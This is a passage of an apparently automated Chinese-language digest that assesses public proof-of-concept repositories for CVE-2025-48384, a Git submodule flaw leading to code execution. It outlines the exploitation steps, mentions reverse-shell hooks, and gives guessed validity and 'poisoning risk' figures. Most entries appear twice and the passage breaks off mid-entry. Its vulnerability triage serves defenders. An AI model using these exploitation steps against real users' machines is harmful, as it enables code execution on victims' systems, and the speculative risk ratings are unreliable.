*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

